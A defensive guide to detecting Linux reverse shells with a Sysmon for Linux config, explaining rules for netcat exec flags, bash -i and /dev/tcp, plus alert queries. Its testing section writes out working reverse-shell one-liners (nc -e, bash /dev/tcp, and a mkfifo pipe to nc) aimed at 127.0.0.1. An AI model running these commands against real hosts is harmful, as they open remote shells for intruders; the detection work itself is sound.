# Sysmon for Linux: Reverse-Shell Detection (nc/ncat/netcat & `bash -i`)

Here’s a practical **Sysmon for Linux** config focused on reverse-shell setup via **netcat (nc/ncat/netcat)** and **`bash -i`** (including `/dev/tcp` tricks). It uses **ProcessCreate** to catch suspicious launches/parent-child chains and **NetworkConnect** to catch the actual outbound dial-out.

---

## 1) Drop-in Sysmon config (XML)

Save as `revshell-sysmon.xml`, then load it:

```bash
sudo sysmon -c revshell-sysmon.xml     # update running config
# (first install example) sudo sysmon -accepteula -i revshell-sysmon.xml
```

> **Notes**  
> • Adjust binary paths to your system (`which nc`, `which ncat`, `which netcat`, `which bash`, `which busybox`).  
> • These rules “include” only the interesting events (low noise).  
> • By default Sysmon for Linux writes to syslog/journald (tag: Sysmon).

```xml
<Sysmon schemaversion="4.80">
  <EventFiltering>

    <!-- =======================
         PROCESS CREATION (Event ID 1)
         ======================= -->

    <!-- A. netcat/ncat launched with exec flags (-e/--exec/-c/--sh-exec) -->
    <ProcessCreate onmatch="include">
      <Image condition="end with">/nc</Image>
      <CommandLine condition="contains any">-e,--exec,-c,--sh-exec</CommandLine>
    </ProcessCreate>

    <ProcessCreate onmatch="include">
      <Image condition="end with">/ncat</Image>
      <CommandLine condition="contains any">-e,--exec,-c,--sh-exec</CommandLine>
    </ProcessCreate>

    <ProcessCreate onmatch="include">
      <Image condition="end with">/netcat</Image>
      <CommandLine condition="contains any">-e,--exec,-c,--sh-exec</CommandLine>
    </ProcessCreate>

    <!-- BusyBox applet case: "busybox nc ..." with exec flags -->
    <ProcessCreate onmatch="include">
      <Image condition="end with">/busybox</Image>
      <CommandLine condition="contains any"> busybox nc , busybox ncat , busybox netcat </CommandLine>
      <CommandLine condition="contains any">-e,--exec,-c,--sh-exec</CommandLine>
    </ProcessCreate>

    <!-- B. Parent/child chain: netcat spawns an interactive shell -->
    <ProcessCreate onmatch="include">
      <ParentImage condition="end with">/nc</ParentImage>
      <Image condition="end with">/bash</Image>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <ParentImage condition="end with">/ncat</ParentImage>
      <Image condition="end with">/bash</Image>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <ParentImage condition="end with">/netcat</ParentImage>
      <Image condition="end with">/bash</Image>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <ParentImage condition="end with">/busybox</ParentImage>
      <ParentCommandLine condition="contains any"> busybox nc , busybox ncat , busybox netcat </ParentCommandLine>
      <Image condition="end with">/bash</Image>
    </ProcessCreate>

    <!-- C. bash launched explicitly interactive (often used in rev shells) -->
    <ProcessCreate onmatch="include">
      <Image condition="end with">/bash</Image>
      <CommandLine condition="contains"> -i </CommandLine>
    </ProcessCreate>

    <!-- D. bash using /dev/tcp (classic one-liner) -->
    <ProcessCreate onmatch="include">
      <Image condition="end with">/bash</Image>
      <CommandLine condition="contains">/dev/tcp/</CommandLine>
    </ProcessCreate>


    <!-- =======================
         NETWORK CONNECT (Event ID 3)
         ======================= -->

    <!-- E. Outbound connects made by netcat variants -->
    <NetworkConnect onmatch="include">
      <Image condition="end with">/nc</Image>
    </NetworkConnect>
    <NetworkConnect onmatch="include">
      <Image condition="end with">/ncat</Image>
    </NetworkConnect>
    <NetworkConnect onmatch="include">
      <Image condition="end with">/netcat</Image>
    </NetworkConnect>
    <NetworkConnect onmatch="include">
      <Image condition="end with">/busybox</Image>
      <CommandLine condition="contains any"> busybox nc , busybox ncat , busybox netcat </CommandLine>
    </NetworkConnect>

    <!-- F. Outbound connects made by bash itself (via /dev/tcp) -->
    <NetworkConnect onmatch="include">
      <Image condition="end with">/bash</Image>
      <!-- Optional: ignore loopback to cut noise -->
      <DestinationIp condition="is not">127.0.0.1</DestinationIp>
      <DestinationHostname condition="is not">localhost</DestinationHostname>
    </NetworkConnect>

  </EventFiltering>
</Sysmon>
```

---

## 2) Why these rules work (detection logic)

- **A – Exec flags on nc/ncat/netcat**: Reverse shells commonly use `-e /bin/bash`, `--exec`, or `-c`/`--sh-exec` to hand a shell to the socket. Matching **Image** + **CommandLine** reduces noise versus arg-only matches.
- **B – Parent=nc → Child=bash**: Even when `-e` isn’t available (OpenBSD nc), attackers chain FIFOs or `-c` to spawn a shell; the parent-child creates a strong signal.
- **C – `bash -i`**: Interactive shells indicate TTY-style sessions; often part of reverse shells and upgrade tricks.
- **D – `/dev/tcp`**: Bash’s special file for sockets; `/dev/tcp/host/port` is a classic one-liner.
- **E – Netcat outbound**: Captures the actual **connect()** from nc/ncat/netcat so you can pivot on dest IP/port, user, container namespace, etc.
- **F – Bash outbound**: Bash shouldn’t usually initiate TCP connections; when it does (non-loopback), it’s suspicious and typically `/dev/tcp`.

---

## 3) How to test (generate events on a lab box)

Open two terminals.

### Test 1 — Netcat reverse shell with `-e`
**Listener (A):**
```bash
nc -lv 4444
```
**Victim (B):** (use the nc you actually have)
```bash
nc 127.0.0.1 4444 -e /bin/bash
# or with ncat:
ncat 127.0.0.1 4444 --exec /bin/bash --sh-exec "bash -i"
```
**Expected Sysmon events**
- `ProcessCreate`: Image=/.../nc (or /ncat), CommandLine contains `-e`/`--exec`
- `ProcessCreate`: ParentImage=/.../nc, Image=/.../bash (on some variants)
- `NetworkConnect`: Image=/.../nc (dest 127.0.0.1:4444)

### Test 2 — Bash `/dev/tcp` one-liner
**Listener (A):**
```bash
nc -lv 4445
```
**Victim (B):**
```bash
bash -i >& /dev/tcp/127.0.0.1/4445 0>&1
```
**Expected Sysmon events**
- `ProcessCreate`: Image=/.../bash, CommandLine contains `/dev/tcp/`
- `ProcessCreate`: Image=/.../bash, CommandLine contains `-i`
- `NetworkConnect`: Image=/.../bash, Destination 127.0.0.1:4445

### Test 3 — OpenBSD nc FIFO trick (no `-e`)
**Listener (A):**
```bash
nc -lv 4446
```
**Victim (B):**
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 4446 > /tmp/f
```
**Expected Sysmon events**
- `ProcessCreate`: Image=/.../nc (no `-e`, so rule E still gets the **NetworkConnect**)
- `NetworkConnect`: Image=/.../nc, Destination 127.0.0.1:4446
- (Optional) `ProcessCreate`: Parent=sh → child bash/sh depending on your pipeline

### Viewing the logs
```bash
# journald (most common)
sudo journalctl -f -t Sysmon

# or if forwarded to syslog file
sudo tail -f /var/log/syslog | grep Sysmon
```

---

## 4) Tuning tips (reduce noise, improve fidelity)

- **Scope by user**: If a service account legitimately uses nc, add an exclude for that user (e.g., `User condition="is not">backup</User>` inside the relevant rule).
- **Ignore localhost** on F: If you see dev scripts using bash sockets locally, keep the `DestinationIp/Hostname is not localhost` lines (already in the sample).
- **Add `socat`**: Many attackers use `socat`; clone A/B/E rules with `Image end with` `/socat` and `CommandLine contains` `exec:` or `pty,raw,echo=0`.
- **Containers**: If you ship Sysmon from host namespaces, also key on **User**, **ContainerId** (where exposed), and **ImageLoaded** paths to see which container produced the event.

---

## 5) Quick “alert” patterns (grep or SIEM)

**Grep/journald** (quick smoke test):
```bash
journalctl -t Sysmon | grep -Ei '(nc|ncat|netcat).*(-e|--exec|--sh-exec|-c )'
journalctl -t Sysmon | grep -Ei 'EventType=NetworkConnect.*Image=.*/bash'
```

**Splunk** (if forwarding syslog):
```spl
index=syslog sourcetype=syslog "Sysmon" (EventType=ProcessCreate Image=*/*nc* CommandLine IN ("*-e*","*--exec*","*--sh-exec*","*-c*"))
OR (EventType=ProcessCreate ParentImage=*/*nc* Image=*/*bash)
OR (EventType=ProcessCreate Image=*/*bash* CommandLine="*/dev/tcp/*")
OR (EventType=NetworkConnect Image=*/*bash* NOT (DestinationIp=127.0.0.1 OR DestinationHostname=localhost))
OR (EventType=NetworkConnect Image=*/*nc* OR Image=*/*ncat* OR Image=*/*netcat*)
```

---

## Summary

- **ProcessCreate** rules catch intent (exec flags, `/dev/tcp`, parent→child).  
- **NetworkConnect** rules catch the action (the outbound dial).  
- The testing steps exercise all paths (nc `-e`, bash `/dev/tcp`, FIFO trick), so you can verify firing and tune as needed.
